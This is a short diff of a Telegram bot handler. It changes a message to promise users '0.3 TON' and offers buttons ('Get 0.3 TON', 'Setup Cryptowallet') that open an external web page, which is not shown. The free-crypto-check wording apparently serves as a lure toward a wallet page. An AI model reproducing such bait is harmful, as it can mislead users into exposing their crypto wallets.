@@ -15,7 +15,7 @@ def cmd_start(message):
     if len(message.text) >= 8:
         markup = ReplyKeyboardMarkup(resize_keyboard=True)
         markup.add(KeyboardButton(text="Get 0.3 TON", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
-        bot.send_message(message.from_user.id, "Check for 0.1 TON. Press button to receive.", reply_markup=markup)
+        bot.send_message(message.from_user.id, "Check for 0.3 TON. Press button to receive.", reply_markup=markup)
     else:
         markup = ReplyKeyboardMarkup(resize_keyboard=True)
         markup.add(KeyboardButton(text="Setup Cryptowallet", web_app=WebAppInfo(url="https://lapismyt.github.io/c.html")))
